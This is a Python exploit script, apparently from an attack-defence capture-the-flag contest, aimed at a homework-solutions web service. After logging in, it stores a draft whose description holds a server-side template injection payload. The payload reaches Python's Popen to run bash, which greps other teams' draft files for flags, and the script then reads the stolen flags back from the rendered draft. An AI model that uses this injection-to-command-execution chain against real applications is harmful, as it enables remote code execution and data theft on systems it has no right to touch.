import requests
import uuid
import json
import os.path

# Базовый URL сервера
BASE_URL = "http://localhost:8000"

def register_user(username: str, password: str, realname: str = None):
    """Регистрирует нового пользователя."""
    url = f"{BASE_URL}/register"
    headers = {"Content-Type": "application/json"}
    data = {
        "username": username,
        "password": password,
    }
    if realname:
        data["realname"] = realname

    try:
        response = requests.post(url, json=data, headers=headers)
        response.raise_for_status()
        print("Регистрация успешна:", response.json())
        return response.json()  # Возвращает токен доступа
    except requests.exceptions.HTTPError as e:
        print("Ошибка при регистрации:", e.response.status_code, e.response.text)
        return None
    except requests.exceptions.RequestException as e:
        print("Ошибка запроса при регистрации:", str(e))
        return None

def login_user(username: str, password: str):
    """Выполняет вход для пользователя."""
    url = f"{BASE_URL}/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "username": username,
        "password": password
    }

    try:
        response = requests.post(url, data=data, headers=headers)
        response.raise_for_status()
        print("Вход успешен:", response.json())
        return response.json()  # Возвращает токен доступа
    except requests.exceptions.HTTPError as e:
        print("Ошибка при входе:", e.response.status_code, e.response.text)
        return None
    except requests.exceptions.RequestException as e:
        print("Ошибка запроса при входе:", str(e))
        return None

def create_draft(token: str, start_position: int = 10):
    """Создаёт черновик с SSTI-нагрузкой."""
    url = f"{BASE_URL}/gdz/save_draft"
    
    # Формируем команду с подстановкой значений
    malicious_description = """{{
    ''.__class__.__mro__[1].__subclasses__()[256](
        ['bash', '-c', 'for i in {10..60}; do [ -f "drafts/draft_$i.txt" ] && grep -oE "TEAM[0-9]{3}_[A-Z0-9]{32}" "drafts/draft_$i.txt"; done | paste -sd "," -'],
        stdout=-1
    ).communicate()[0].decode('utf-8', errors='ignore').strip()
}}"""
    draft_data = {
        "description": malicious_description,
        "full_description": "Test full description",
        "category": "math", 
        "subject": "algebra",
        "content_text": "Sample content",
        "price": 0,
        "is_elite": False,
        "gdz_id": None
    }

    headers = {
        "Authorization": f"Bearer {token}",
    }

    try:
        response = requests.post(
            url,
            json=draft_data,
            headers=headers
        )
        response.raise_for_status()
        print("Черновик создан:", response.json())
        return response.json()
    except requests.exceptions.HTTPError as e:
        print("HTTP ошибка при создании черновика:", e.response.status_code, e.response.text)
        return None
    except requests.exceptions.RequestException as e:
        print("Ошибка запроса при создании черновика:", str(e))
        return None


def get_draft(token: str):
    """Получает данные черновика."""
    url = f"{BASE_URL}/gdz/get_draft"
    headers = {"Authorization": f"Bearer {token}"}

    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        print("Черновик получен:", response.json())
        return response.json()
    except requests.exceptions.HTTPError as e:
        print("HTTP ошибка при получении черновика:", e.response.status_code, e.response.text)
        return None
    except requests.exceptions.RequestException as e:
        print("Ошибка запроса при получении черновика:", str(e))
        return None

def create_gdz_from_draft(token: str, draft_data: dict, image_path: str = "solution.png"):
    """Создаёт ГДЗ из предоставленных данных черновика, загружая указанный файл."""
    print(f"Текущая рабочая директория: {os.getcwd()}")
    print(f"Указанный путь к файлу: {image_path}")
    print(f"Полный путь к файлу: {os.path.abspath(image_path)}")
    # Проверяем наличие файла
    if not os.path.exists(image_path):
        print(f"Файл {image_path} не найден")
        return None

    # Формируем данные для schemas.GDZCreate
    gdz_data = {
        "description": draft_data.get("description", ""),
        "full_description": draft_data.get("full_description", ""),
        "category": f"{draft_data.get('subject')}_{draft_data.get('category')}",
        "content_text": draft_data.get("content_text", ""),
        "price": draft_data.get("price", 0),
        "is_elite": draft_data.get("is_elite", False)
    }

    # Преобразуем gdz_data в JSON-строку для gdz_str
    gdz_str = json.dumps(gdz_data)

    url = f"{BASE_URL}/gdz/create"
    headers = {"Authorization": f"Bearer {token}"}

    # Подготавливаем multipart/form-data
    files = {
        "content_file": (os.path.basename(image_path), open(image_path, "rb"), "image/png")
    }
    data = {
        "gdz_str": gdz_str
    }

    try:
        response = requests.post(
            url,
            headers=headers,
            files=files,
            data=data
        )
        response.raise_for_status()
        print("ГДЗ создано:", response.json())
        return response.json()
    except requests.exceptions.HTTPError as e:
        print("HTTP ошибка при создании ГДЗ:", e.response.status_code, e.response.text)
        return None
    except requests.exceptions.RequestException as e:
        print("Ошибка запроса при создании ГДЗ:", str(e))
        return None
    finally:
        # Закрываем файл
        if "content_file" in files:
            files["content_file"][1].close()

def main():
    # Генерируем уникальный username
    unique_username = f"user_{uuid.uuid4().hex[:8]}"
    password = "securepassword123"
    realname = "Test User"

    # Регистрация пользователя
    # print(f"Регистрация пользователя: {unique_username}")
    # register_response = register_user(unique_username, password, realname)
    # if not register_response:
    #     print("Не удалось зарегистрировать пользователя")
    #     return

    # Вход пользователя
    print(f"\nВход пользователя: {unique_username}")
    login_response = login_user('user_014ba28c', password)
    if not login_response:
        print("Не удалось войти")
        return

    # Получение токена
    access_token = login_response.get("access_token")
    if not access_token:
        print("Токен доступа не получен")
        return
    print(f"Получен токен доступа: {access_token}")

    # Создание черновика
    print("\nСоздание черновика")
    create_draft_response = create_draft(access_token, start_position=10)
    if not create_draft_response:
        print("Не удалось создать черновик")
        return

    # Получение черновика
    print("\nПолучение черновика")
    draft_data = get_draft(access_token)
    if not draft_data:
        print("Не удалось получить черновик")
        return
    print(draft_data)

    # Создание ГДЗ из черновика
    print("\nСоздание ГДЗ из черновика")
    create_gdz_response = create_gdz_from_draft(access_token, draft_data, image_path="../solution.png")
    
    flags = draft_data.get("description").split(",")
    print(flags)

if __name__ == "__main__":
    main()